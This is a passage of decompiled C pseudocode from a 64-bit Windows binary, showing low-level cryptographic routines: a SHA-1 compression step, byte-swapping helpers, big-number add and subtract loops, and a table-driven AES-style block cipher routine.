  v191 = __ROL4__(v166 ^ v183 ^ v138 ^ v144, 1);
  v192 = __ROL4__(v165 ^ v179 ^ v131 ^ v142, 1);
  v193 = v185 & (unsigned int)v6 | v180 & (v185 | (unsigned int)v6);
  v185 = __ROL4__(v185, 30);
  v194 = v191;
  v195 = v188 & v185;
  v196 = v175 + v189 + v193 + __ROL4__(v190, 5) - 1894007588;
  v197 = __ROL4__(__ROL4__(v164, 1) ^ v189 ^ v144 ^ v256, 1);
  v198 = (unsigned int)v6 & (v188 | v185);
  v188 = __ROL4__(v188, 30);
  v199 = __ROL4__(v196, 5);
  v200 = v180 - 1894007588 + v191 + (v195 | v198);
  v201 = (v196 ^ v188 ^ v185) - 899497514;
  v196 = __ROL4__(v196, 30);
  v202 = v200 + v199;
  v203 = __ROL4__(v167 ^ v265 ^ v142 ^ v260, 1);
  v261 = __ROL4__(v154 ^ v178 ^ v191 ^ v260, 1);
  v204 = (_DWORD)v6 + v203 + v201 + __ROL4__(v202, 5);
  v205 = v185 + v197 + (v202 ^ v196 ^ v188) + __ROL4__(v204, 5) - 899497514;
  v202 = __ROL4__(v202, 30);
  v206 = v188 + v261 + (v202 ^ v196 ^ v204) + __ROL4__(v205, 5) - 899497514;
  v204 = __ROL4__(v204, 30);
  v207 = v156 ^ v179 ^ v203 ^ v256;
  v257 = __ROL4__(v207, 1);
  LODWORD(v6) = __ROL4__(v156 ^ v166 ^ v265 ^ v261, 1);
  v208 = __ROL4__(v154 ^ v165 ^ v186 ^ v197, 1);
  v209 = __ROL4__(v165 ^ v167 ^ v189 ^ __ROL4__(v207, 1), 1);
  v210 = v196 + __ROL4__(v207, 1) + (v202 ^ v205 ^ v204) + __ROL4__(v206, 5) - 899497514;
  v205 = __ROL4__(v205, 30);
  v211 = __ROL4__(v154 ^ v165 ^ v186 ^ v197, 1);
  v212 = v208 + (v206 ^ v205 ^ v204);
  v213 = (signed int)v6;
  v206 = __ROL4__(v206, 30);
  v214 = __ROL4__(v208 ^ v166 ^ __ROL4__(v164, 1) ^ v191, 1);
  v215 = v202 + v212 + __ROL4__(v210, 5) - 899497514;
  v216 = v204 + (_DWORD)v6 + (v210 ^ v206 ^ v205) + __ROL4__(v215, 5) - 899497514;
  v210 = __ROL4__(v210, 30);
  v217 = v205 + v209 + (v215 ^ v210 ^ v206) + __ROL4__(v216, 5) - 899497514;
  v215 = __ROL4__(v215, 30);
  v218 = v206 + v214 + (v215 ^ v210 ^ v216) + __ROL4__(v217, 5) - 899497514;
  v216 = __ROL4__(v216, 30);
  v219 = v215 ^ v217 ^ v216;
  v217 = __ROL4__(v217, 30);
  v220 = __ROL4__((unsigned int)v6 ^ v167 ^ v178 ^ v203, 1);
  v221 = __ROL4__(v220 ^ v181 ^ v265 ^ v257, 1);
  v222 = v210 + v220 + v219 + __ROL4__(v218, 5) - 899497514;
  v223 = v218 ^ v217 ^ v216;
  v218 = __ROL4__(v218, 30);
  v224 = __ROL4__(v209 ^ __ROL4__(v164, 1) ^ v181 ^ v197, 1);
  v225 = __ROL4__(v214 ^ v178 ^ v186 ^ v261, 1);
  v226 = __ROL4__((unsigned int)v6 ^ v167 ^ v178 ^ v203, 1);
  v227 = __ROL4__(v222, 5) + v224 + v223 - 899497514 + v215;
  v228 = v222 ^ v218 ^ v217;
  v222 = __ROL4__(v222, 30);
  LODWORD(v6) = v216 - 899497514 + v225 + v228 + __ROL4__(v227, 5);
  v229 = v221 + (v227 ^ v222 ^ v218);
  v227 = __ROL4__(v227, 30);
  v230 = __ROL4__(v211 ^ v224 ^ v186 ^ v192, 1);
  v231 = v217 - 899497514 + v229 + __ROL4__((_DWORD)v6, 5);
  v232 = v222 ^ (unsigned int)v6;
  LODWORD(v6) = __ROL4__((_DWORD)v6, 30);
  v233 = v218 - 899497514 + v230 + (v227 ^ v232) + __ROL4__(v231, 5);
  v234 = __ROL4__(v213 ^ v225 ^ v265 ^ v194, 1);
  v235 = v227 ^ v231 ^ (unsigned int)v6;
  v231 = __ROL4__(v231, 30);
  v236 = v222 + v234 + v235 - 899497514 + __ROL4__(v233, 5);
  v237 = __ROL4__(v209 ^ v221 ^ v192 ^ v203, 1);
  v238 = v227 - 899497514 + v237 + (v233 ^ v231 ^ (unsigned int)v6);
  v233 = __ROL4__(v233, 30);
  v239 = v238 + __ROL4__(v236, 5);
  v240 = __ROL4__(v214 ^ v230 ^ v194 ^ v197, 1);
  v241 = (v236 ^ v233 ^ v231) - 899497514;
  v236 = __ROL4__(v236, 30);
  v242 = __ROL4__(v226 ^ v234 ^ v203 ^ v261, 1);
  LODWORD(v6) = __ROL4__(v239, 5) + v240 + v241 + (_DWORD)v6;
  v243 = v231 - 899497514 + v242 + (v239 ^ v236 ^ v233);
  v244 = v243 + __ROL4__((_DWORD)v6, 5);
  v239 = __ROL4__(v239, 30);
  v245 = __ROL4__(v243 + __ROL4__((_DWORD)v6, 5), 5) + __ROL4__(v224 ^ v237 ^ v197 ^ v257, 1);
  v246 = (signed int)v6;
  LODWORD(v6) = __ROL4__((_DWORD)v6, 30);
  v247 = v233 + (v239 ^ v236 ^ v246) - 899497514 + v245;
  v248 = v244 ^ (unsigned int)v6;
  v244 = __ROL4__(v244, 30);
  v249 = v253;
  v249[3] += v244;
  v250 = v236 - 899497514 + (v239 ^ v248) + __ROL4__(v247, 5) + __ROL4__(v211 ^ v225 ^ v261 ^ v240, 1);
  v251 = *v253 + (v247 ^ v244 ^ (unsigned int)v6);
  v249[1] += v250;
  v249[2] += __ROL4__(v247, 30);
  result = v251 + __ROL4__(v250, 5) + v239 + __ROL4__(v213 ^ v221 ^ v242 ^ v257, 1) - 899497514;
  v249[4] += (_DWORD)v6;
  *v253 = result;
  return result;
}

//----- (0000000140062E60) ----------------------------------------------------
__int64 __fastcall sub_140062E60(const __m128i *a1, __int64 a2)
{
  const __m128i *v2; // r10
  __int64 v3; // r9
  unsigned __int64 v4; // rax
  int *v5; // rax
  signed __int64 v6; // rcx
  __m128i v7; // xmm0
  signed __int64 v8; // rdx
  int v10; // [rsp+1Ch] [rbp-5Ch]
  int v11; // [rsp+20h] [rbp-58h]

  v2 = a1;
  v3 = a2 - (_QWORD)&v11;
  v4 = 0i64;
  if ( dword_1400D8200 < 2 )
  {
    do
    {
      v8 = v3 + 4 * v4++;
      *(&v10 + v4) = _byteswap_ulong(*(int *)((char *)&v11 + v8));
    }
    while ( v4 < 0x10 );
  }
  else
  {
    v5 = &v11;
    v6 = 2i64;
    do
    {
      v7 = _mm_loadu_si128((const __m128i *)((char *)v5 + v3));
      v5 += 8;
      _mm_storeu_si128((__m128i *)v5 - 2, _mm_shuffle_epi8(v7, (__m128i)xmmword_1400AD230));
      _mm_storeu_si128(
        (__m128i *)v5 - 1,
        _mm_shuffle_epi8(_mm_loadu_si128((const __m128i *)((char *)v5 + v3 - 16)), (__m128i)xmmword_1400AD230));
      --v6;
    }
    while ( v6 );
  }
  return sub_1400639D0(v2, (unsigned __int64 *)&v11, 64i64);
}
// 1400AD230: using guessed type __int128 xmmword_1400AD230;
// 1400D8200: using guessed type int dword_1400D8200;

//----- (0000000140062F10) ----------------------------------------------------
_BOOL8 __fastcall sub_140062F10(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  signed __int64 v4; // rdx
  signed __int64 v5; // r8
  signed __int64 v6; // r9
  bool v7; // cf
  __int64 v8; // rcx
  __int64 v9; // rax
  unsigned __int8 v10; // cf
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rtt
  __int64 v14; // rax
  _BOOL8 v15; // rax
  _BOOL8 v16; // rtt

  v4 = a2 + 8 * a1;
  v5 = a3 + 8 * a1;
  v6 = a4 + 8 * a1;
  v8 = -a1;
  v7 = v8 != 0;
  if ( v8 )
  {
    v9 = *(_QWORD *)(v5 + 8 * v8);
    v10 = __CFADD__(*(_QWORD *)(v6 + 8 * v8), v9);
    for ( *(_QWORD *)(v4 + 8 * v8) = *(_QWORD *)(v6 + 8 * v8) + v9;
          ;
          *(_QWORD *)(v4 + 8 * v8) = *(_QWORD *)(v6 + 8 * v8) + v15 )
    {
      v11 = *(_QWORD *)(v5 + 8 * v8 + 8);
      v13 = v10;
      v7 = __CFADD__(v10, v11);
      v12 = v13 + v11;
      v7 |= __CFADD__(*(_QWORD *)(v6 + 8 * v8 + 8), v12);
      *(_QWORD *)(v4 + 8 * v8 + 8) = *(_QWORD *)(v6 + 8 * v8 + 8) + v12;
      v8 += 2i64;
      if ( !v8 )
        break;
      v14 = *(_QWORD *)(v5 + 8 * v8);
      v16 = v7;
      v7 = __CFADD__(v7, v14);
      v15 = v16 + v14;
      v10 = v7 | __CFADD__(*(_QWORD *)(v6 + 8 * v8), v15);
    }
  }
  return v7;
}

//----- (0000000140062F60) ----------------------------------------------------
_BOOL8 __fastcall sub_140062F60(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  signed __int64 v4; // rdx
  signed __int64 v5; // r8
  signed __int64 v6; // r9
  bool v7; // cf
  __int64 v8; // rcx
  unsigned __int64 v9; // rax
  bool v10; // cf
  unsigned __int64 v11; // rax
  unsigned __int64 v12; // rtt
  unsigned __int64 v13; // rax
  unsigned __int64 v14; // rtt

  v4 = a2 + 8 * a1;
  v5 = a3 + 8 * a1;
  v6 = a4 + 8 * a1;
  v8 = -a1;
  v7 = v8 != 0;
  if ( v8 )
  {
    v9 = *(_QWORD *)(v5 + 8 * v8);
    v10 = v9 < *(_QWORD *)(v6 + 8 * v8);
    for ( *(_QWORD *)(v4 + 8 * v8) = v9 - *(_QWORD *)(v6 + 8 * v8); ; *(_QWORD *)(v4 + 8 * v8) = v13 - v14 )
    {
      v11 = *(_QWORD *)(v5 + 8 * v8 + 8);
      v12 = v10 + *(_QWORD *)(v6 + 8 * v8 + 8);
      v7 = v11 < v12;
      *(_QWORD *)(v4 + 8 * v8 + 8) = v11 - v12;
      v8 += 2i64;
      if ( !v8 )
        break;
      v13 = *(_QWORD *)(v5 + 8 * v8);
      v14 = v7 + *(_QWORD *)(v6 + 8 * v8);
      v10 = v13 < v14;
    }
  }
  return v7;
}

//----- (0000000140062FB0) ----------------------------------------------------
__m128i *__usercall sub_140062FB0@<rax>(const __m128i *a1@<rdx>, __m128i *a2@<rcx>, __int16 a3@<r10w>)
{
  __m128i *v3; // r8
  __int64 v4; // rdi
  signed __int64 v5; // rsi
  signed __int64 v6; // rax
  __m128i v7; // xmm4
  __m128i v8; // xmm1
  __int32 v9; // er12
  __int32 v10; // ebx
  __int32 v11; // ecx
  __int32 v12; // edx
  signed __int64 v13; // rax
  int v14; // et1
  signed __int64 v15; // rax
  int v16; // et1
  signed __int64 v17; // rax
  int v18; // et1
  __int64 v19; // rax
  __int64 v20; // rsi
  const __m128i *v21; // rsi
  __m128i v22; // xmm2
  int v23; // eax
  unsigned int v24; // eax
  __m128i v25; // xmm2
  int v26; // er12
  int v27; // edx
  int v28; // ecx
  int v29; // ebx
  unsigned int v30; // eax
  unsigned int v31; // edi
  int v32; // ebx
  int v33; // er12
  int v34; // edx
  int v35; // ecx
  unsigned int v36; // eax
  int v37; // edi
  int v38; // ecx
  int v39; // ebx
  int v40; // er12
  unsigned int v41; // edx
  unsigned int v42; // ecx
  unsigned int v43; // ebx
  int v44; // edi
  int v45; // er9
  int v46; // eax
  int v47; // eax
  int v48; // ebx
  int v49; // ebx
  int v50; // edi
  int v51; // er9
  __int64 v52; // rcx
  int v53; // edx
  __m128i v54; // xmm2
  unsigned int v55; // eax
  __m128i v56; // xmm2
  unsigned int v57; // edi
  int v58; // er12
  int v59; // edx
  int v60; // ecx
  int v61; // ebx
  int v62; // er12
  unsigned int v63; // eax
  int v64; // edx
  int v65; // ecx
  unsigned int v66; // eax
  unsigned int v67; // edi
  int v68; // ecx
  int v69; // ebx
  int v70; // er12
  unsigned int v71; // edx
  unsigned int v72; // ecx
  unsigned int v73; // eax
  unsigned int v74; // ebx
  unsigned int v75; // eax
  signed __int64 v76; // r8
  unsigned int v77; // edx
  unsigned int v78; // ebx
  int v79; // ecx
  unsigned int v80; // ecx
  unsigned int v81; // eax
  unsigned int v82; // edx
  int v83; // er9
  int v84; // edi
  unsigned int v85; // eax
  int v86; // edi
  int v87; // er9
  unsigned int v88; // ebx
  int v89; // er9
  int v90; // eax
  int v91; // ebx
  unsigned int v92; // ecx
  int v93; // eax
  int v94; // ebx
  unsigned int v95; // edx
  int v96; // ebx
  int v97; // er9
  int v98; // edi
  unsigned int v99; // eax
  int v100; // edi
  int v101; // er9
  unsigned int v102; // ebx
  int v103; // er9
  int v104; // eax
  int v105; // ebx
  unsigned int v106; // ecx
  int v107; // eax
  int v108; // ebx
  unsigned int v109; // edx
  int v110; // ebx
  unsigned int v111; // edx
  unsigned int v112; // eax
  unsigned int v113; // ebx
  unsigned int v114; // ecx
  __m128i *v115; // rbx
  __int64 v116; // rcx
  unsigned __int8 v117; // of
  signed __int64 v118; // rcx
  __m128i v119; // xmm2
  __m128i *result; // rax

  v3 = a2;
  v4 = (unsigned int)dword_1400D80C0;
  v5 = a2[19].m128i_i64[0];
  _mm_store_si128(a2 + 12, _mm_load_si128((const __m128i *)((char *)a1 + (a2[19].m128i_i64[0] & 0x10) + 16)));
  v6 = (signed __int64)a1[2].m128i_i64 + (v5 & 0x10) - v5;
  do
  {
    _mm_store_si128((__m128i *)((char *)a2 + v5), _mm_load_si128((const __m128i *)(v5 + v6)));
    v5 += 16i64;
  }
  while ( v5 < 192 );
  v7 = _mm_load_si128((const __m128i *)(v5 + v6));
  v8 = _mm_load_si128(a1);
  v9 = a1[1].m128i_i32[0];
  v10 = a1[1].m128i_i32[1];
  v11 = a1[1].m128i_i32[2];
  v12 = a1[1].m128i_i32[3];
  v13 = 0i64;
  do
  {
    v14 = *(_DWORD *)((char *)&unk_1400DAC70 + v13);
    v15 = v4 + v13;
    v16 = *(_DWORD *)((char *)&unk_1400DAC70 + v15);
    v17 = v4 + v15;
    v18 = *(_DWORD *)((char *)&unk_1400DAC70 + v17);
    v19 = v4 + v17;
    v20 = *(unsigned int *)((char *)&unk_1400DAC70 + v19);
    v13 = v4 + v19;
  }
  while ( v13 < 2048 );
  _mm_lfence();
  if ( !(v3[18].m128i_i32[2] & 1) )
    goto LABEL_7;
  v21 = (const __m128i *)v3[14].m128i_i64[0];
  v22 = _mm_xor_si128(_mm_loadu_si128(v21), v8);
  v8 = _mm_srli_si128(v8, 14);
  v23 = _mm_cvtsi128_si32(v8);
  LOBYTE(v23) = HIBYTE(v21->m128i_i64[1]);
  a3 = v23;
  v24 = _mm_cvtsi128_si32(v22);
  v25 = _mm_srli_si128(v22, 4);
  v26 = *((_DWORD *)&unk_1400DAC70 + 2 * (unsigned __int8)v24 + 1) ^ v9;
  v27 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE1(v24) + 1) ^ v12;
  v24 >>= 16;
  v28 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * (unsigned __int8)v24 + 2) ^ v11;
  v29 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE1(v24) + 3) ^ v10;
  v30 = _mm_cvtsi128_si32(v25);
  v31 = v30;
  v32 = *((_DWORD *)&unk_1400DAC70 + 2 * (unsigned __int8)v30 + 1) ^ v29;
  v33 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE1(v30) + 1) ^ v26;
  v30 >>= 16;
  v34 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * (unsigned __int8)v30 + 2) ^ v27;
  v35 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE1(v30) + 3) ^ v28;
  v36 = v31;
  v37 = _mm_cvtsi128_si32(v25);
  v38 = *((_DWORD *)&unk_1400DAC70 + 2 * (unsigned __int8)v36 + 1) ^ v35;
  v39 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE1(v36) + 1) ^ v32;
  v36 >>= 16;
  v40 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * (unsigned __int8)v36 + 2) ^ v33;
  v41 = *((_DWORD *)&unk_1400DAC70 + 2 * (unsigned __int8)v37 + 1) ^ *(_DWORD *)((char *)&unk_1400DAC70
                                                                               + 8 * BYTE1(v36)
                                                                               + 3) ^ v34;
  v42 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE1(v37) + 1) ^ v38;
  v43 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE2(v37) + 2) ^ v39;
  v44 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * (unsigned __int8)v43 + 3) ^ v3[12].m128i_i32[2];
  v45 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE1(v43) + 2) ^ *(_DWORD *)((char *)&unk_1400DAC70
                                                                             + 8 * (unsigned __int8)v42
                                                                             + 3) ^ v3[12].m128i_i32[3];
  v43 >>= 16;
  v46 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE1(v42) + 2) ^ *(_DWORD *)((char *)&unk_1400DAC70
                                                                             + 8 * (unsigned __int8)v43
                                                                             + 1) ^ v3[12].m128i_i32[0];
  v42 >>= 16;
  v47 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * (unsigned __int8)v41 + 3) ^ v46;
  v48 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE1(v41) + 2) ^ v3[12].m128i_i32[1] ^ *((_DWORD *)&unk_1400DAC70
                                                                                         + 2 * BYTE1(v43)
                                                                                         + 1);
  v41 >>= 16;
  v49 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * (unsigned __int8)v42 + 1) ^ v48;
  v50 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * (unsigned __int8)v41 + 1) ^ *((_DWORD *)&unk_1400DAC70
                                                                             + 2 * BYTE1(v42)
                                                                             + 1) ^ v44;
  v51 = *((_DWORD *)&unk_1400DAC70 + 2 * BYTE1(v41) + 1) ^ v45;
  v52 = (unsigned int)_mm_cvtsi128_si32(_mm_srli_si128(v25, 3));
  v53 = v40;
  HIDWORD(v3->m128i_i64[1]) = v51;
  LODWORD(v3->m128i_i64[0]) = v47;
  HIDWORD(v3->m128i_i64[0]) = v49;
  LODWORD(v3->m128i_i64[1]) = v50;
LABEL_9:
  ++a3;
  v77 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * v52 + 3) ^ v53;
  v78 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * (unsigned __int8)v77 + 3) ^ v49;
  v79 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE1(v77) + 2);
  v77 >>= 16;
  v80 = LODWORD(v3->m128i_i64[1]) ^ v79;
  v81 = *((_DWORD *)&unk_1400DAC70 + 2 * BYTE1(v77) + 1) ^ v47;
  v82 = HIDWORD(v3->m128i_i64[1]) ^ *(_DWORD *)((char *)&unk_1400DAC70 + 8 * (unsigned __int8)v77 + 1);
  v76 = (signed __int64)v3[3].m128i_i64 + v3[19].m128i_i64[0];
  while ( 1 )
  {
    v97 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * (unsigned __int8)v80 + 3) ^ *(_DWORD *)(v76 - 36);
    LOBYTE(v80) = v81;
    v98 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE1(v81) + 2) ^ *(_DWORD *)(v76 - 40);
    v99 = v81 >> 16;
    v100 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * (unsigned __int8)v78 + 3) ^ v98;
    v101 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE1(v78) + 2) ^ v97;
    v102 = v78 >> 16;
    v103 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * (unsigned __int8)v99 + 1) ^ v101;
    v104 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE1(v80) + 2) ^ *(_DWORD *)((char *)&unk_1400DAC70
                                                                                + 8 * (unsigned __int8)v102
                                                                                + 1) ^ *((_DWORD *)&unk_1400DAC70
                                                                                       + 2 * BYTE1(v99)
                                                                                       + 1);
    v105 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * (unsigned __int8)v80 + 3) ^ *((_DWORD *)&unk_1400DAC70
                                                                                + 2 * BYTE1(v102)
                                                                                + 1);
    v106 = v80 >> 16;
    v107 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * (unsigned __int8)v82 + 3) ^ v104;
    v108 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE1(v82) + 2) ^ v105;
    v109 = v82 >> 16;
    v110 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * (unsigned __int8)v106 + 1) ^ v108;
    v72 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * (unsigned __int8)v109 + 1) ^ *((_DWORD *)&unk_1400DAC70
                                                                                + 2 * BYTE1(v106)
                                                                                + 1) ^ v100;
    v75 = *(_DWORD *)(v76 - 48) ^ v107;
    v74 = *(_DWORD *)(v76 - 44) ^ v110;
    v71 = *((_DWORD *)&unk_1400DAC70 + 2 * BYTE1(v109) + 1) ^ v103;
    v76 += 32i64;
    if ( (_BYTE)v76 )
      goto LABEL_10;
    v3 = (__m128i *)(v76 - 256);
    v3[13].m128i_i16[1] = *((_WORD *)&unk_1400DAC70 + 4 * (unsigned __int8)v71) ^ *((unsigned __int8 *)&unk_1400DAC70
                                                                                  + 8 * BYTE1(v72)
                                                                                  + 1);
    v3[13].m128i_i16[3] = *((_WORD *)&unk_1400DAC70 + 4 * (unsigned __int8)v75) ^ *((unsigned __int8 *)&unk_1400DAC70
                                                                                  + 8 * BYTE1(v71)
                                                                                  + 1);
    v111 = v71 >> 16;
    v3[13].m128i_i16[5] = *((_WORD *)&unk_1400DAC70 + 4 * (unsigned __int8)v74) ^ *((unsigned __int8 *)&unk_1400DAC70
                                                                                  + 8 * BYTE1(v75)
                                                                                  + 1);
    v112 = v75 >> 16;
    v3[13].m128i_i16[7] = *((_WORD *)&unk_1400DAC70 + 4 * (unsigned __int8)v72) ^ *((unsigned __int8 *)&unk_1400DAC70
                                                                                  + 8 * BYTE1(v74)
                                                                                  + 1);
    v113 = v74 >> 16;
    v3[13].m128i_i16[6] = *((_WORD *)&unk_1400DAC70 + 4 * (unsigned __int8)v112) ^ *((unsigned __int8 *)&unk_1400DAC70
                                                                                   + 8 * BYTE1(v111)
                                                                                   + 1);
    v114 = v72 >> 16;
    v3[13].m128i_i16[0] = *((_WORD *)&unk_1400DAC70 + 4 * (unsigned __int8)v113) ^ *((unsigned __int8 *)&unk_1400DAC70
                                                                                   + 8 * BYTE1(v112)
                                                                                   + 1);
    v3[13].m128i_i16[2] = *((_WORD *)&unk_1400DAC70 + 4 * (unsigned __int8)v114) ^ *((unsigned __int8 *)&unk_1400DAC70
                                                                                   + 8 * BYTE1(v113)
                                                                                   + 1);
    v3[13].m128i_i16[4] = *((_WORD *)&unk_1400DAC70 + 4 * (unsigned __int8)v111) ^ *((unsigned __int8 *)&unk_1400DAC70
                                                                                   + 8 * BYTE1(v114)
                                                                                   + 1);
    v115 = (__m128i *)v3[15].m128i_i64[1];
    v116 = v3[18].m128i_i64[1];
    v117 = __OFSUB__(v116, 16i64);
    v118 = v116 - 16;
    v119 = _mm_xor_si128(_mm_loadu_si128((const __m128i *)v3[15].m128i_i64[0]), v7);
    _mm_store_si128(v3 + 15, _mm_add_epi64(_mm_load_si128(v3 + 17), v3[15]));
    _mm_storeu_si128(v115, _mm_xor_si128(v119, v3[13]));
    if ( (unsigned __int8)((v118 < 0) ^ v117) | (v118 == 0) )
      break;
    v3[18].m128i_i64[1] = v118;
    if ( v118 & 1 )
    {
      v53 = v40;
      v47 = v3->m128i_i64[0];
      v49 = HIDWORD(v3->m128i_i64[0]);
      v52 = (unsigned __int8)(HIBYTE(a3) ^ a3);
      goto LABEL_9;
    }
    _mm_store_si128(v3 + 14, _mm_add_epi64(_mm_load_si128(v3 + 16), v3[14]));
    v9 = v3[12].m128i_i32[0];
    v10 = v3[12].m128i_i32[1];
    v11 = v3[12].m128i_i32[2];
    v12 = v3[12].m128i_i32[3];
LABEL_7:
    v54 = _mm_xor_si128(
            _mm_xor_si128(_mm_loadu_si128((const __m128i *)v3[14].m128i_i64[0]), v8),
            _mm_loadu_si128((const __m128i *)v3[14].m128i_i64[1]));
    v55 = _mm_cvtsi128_si32(v54);
    v56 = _mm_srli_si128(v54, 4);
    v57 = _mm_cvtsi128_si32(v56);
    v58 = *((_DWORD *)&unk_1400DAC70 + 2 * (unsigned __int8)v55 + 1) ^ v9;
    v59 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE1(v55) + 1) ^ v12;
    v55 >>= 16;
    v60 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * (unsigned __int8)v55 + 2) ^ v11;
    v61 = *((_DWORD *)&unk_1400DAC70 + 2 * (unsigned __int8)v57 + 1) ^ *(_DWORD *)((char *)&unk_1400DAC70
                                                                                 + 8 * BYTE1(v55)
                                                                                 + 3) ^ v10;
    v62 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE1(v57) + 1) ^ v58;
    v63 = v57 >> 16;
    v64 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE2(v57) + 2) ^ v59;
    v65 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE1(v63) + 3) ^ v60;
    v66 = v57;
    v67 = v57;
    v68 = *((_DWORD *)&unk_1400DAC70 + 2 * (unsigned __int8)v66 + 1) ^ v65;
    v69 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE1(v66) + 1) ^ v61;
    v66 >>= 16;
    v70 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * (unsigned __int8)v66 + 2) ^ v62;
    v71 = *((_DWORD *)&unk_1400DAC70 + 2 * (unsigned __int8)v67 + 1) ^ *(_DWORD *)((char *)&unk_1400DAC70
                                                                                 + 8 * BYTE1(v66)
                                                                                 + 3) ^ v64;
    v72 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE1(v67) + 1) ^ v68;
    v73 = v67 >> 16;
    v74 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE2(v67) + 2) ^ v69;
    v40 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE1(v73) + 3) ^ v70;
    v75 = v40;
    v76 = (signed __int64)v3[4].m128i_i64 + v3[19].m128i_i64[0];
LABEL_10:
    v83 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * (unsigned __int8)v72 + 3) ^ *(_DWORD *)(v76 - 52);
    LOBYTE(v72) = v75;
    v84 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE1(v75) + 2) ^ *(_DWORD *)(v76 - 56);
    v85 = v75 >> 16;
    v86 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * (unsigned __int8)v74 + 3) ^ v84;
    v87 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE1(v74) + 2) ^ v83;
    v88 = v74 >> 16;
    v89 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * (unsigned __int8)v85 + 1) ^ v87;
    v90 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE1(v72) + 2) ^ *(_DWORD *)((char *)&unk_1400DAC70
                                                                               + 8 * (unsigned __int8)v88
                                                                               + 1) ^ *((_DWORD *)&unk_1400DAC70
                                                                                      + 2 * BYTE1(v85)
                                                                                      + 1);
    v91 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * (unsigned __int8)v72 + 3) ^ *((_DWORD *)&unk_1400DAC70
                                                                               + 2 * BYTE1(v88)
                                                                               + 1);
    v92 = v72 >> 16;
    v93 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * (unsigned __int8)v71 + 3) ^ v90;
    v94 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * BYTE1(v71) + 2) ^ v91;
    v95 = v71 >> 16;
    v96 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * (unsigned __int8)v92 + 1) ^ v94;
    v80 = *(_DWORD *)((char *)&unk_1400DAC70 + 8 * (unsigned __int8)v95 + 1) ^ *((_DWORD *)&unk_1400DAC70
                                                                               + 2 * BYTE1(v92)
                                                                               + 1) ^ v86;
    v81 = *(_DWORD *)(v76 - 64) ^ v93;
    v78 = *(_DWORD *)(v76 - 60) ^ v96;
    v82 = *((_DWORD *)&unk_1400DAC70 + 2 * BYTE1(v95) + 1) ^ v89;
  }
  result = v3 + 7;
  result[-7] = 0i64;
  result[-6] = 0i64;
  result[-5] = 0i64;
  result[-4] = 0i64;
  result[-3] = 0i64;
  result[-2] = 0i64;
  result[-1] = 0i64;
  *result = 0i64;
  result[1] = 0i64;
  result[2] = 0i64;
  result[3] = 0i64;
  result[4] = 0i64;
  result[5] = 0i64;
  result[6] = 0i64;
  return result;
}
// 1400D80C0: using guessed type int dword_1400D80C0;

//----- (0000000140063608) ----------------------------------------------------
__int16 __fastcall sub_140063608(const __m128i *a1, __int64 a2, __m128i *a3, __int64 a4)
{
  __m128i v4; // xmm0
  __m128i v5; // xmm0
  int v6; // ebx
  unsigned int v7; // eax
  unsigned int v8; // ebx
  __m128i v9; // xmm5
  __m128i v10; // xmm4
  __m128i v11; // xmm3
  __m128i v12; // xmm2
  __m128i v13; // xmm0
  unsigned int v14; // eax
  __m128i v15; // xmm5
  __m128i v16; // xmm4
  __m128i v17; // xmm3
  __m128i v18; // xmm2
  unsigned int v19; // ebx
  __m128i v20; // xmm5
  __m128i v21; // xmm4
  __m128i v22; // xmm3
  __m128i v23; // xmm2
  unsigned int v24; // eax
  __m128i v25; // xmm5
  __m128i v26; // xmm4
  __m128i v27; // xmm3
  __m128i v28; // xmm2
  unsigned int v29; // ebx
  __m128i v30; // xmm5
  __m128i v31; // xmm4
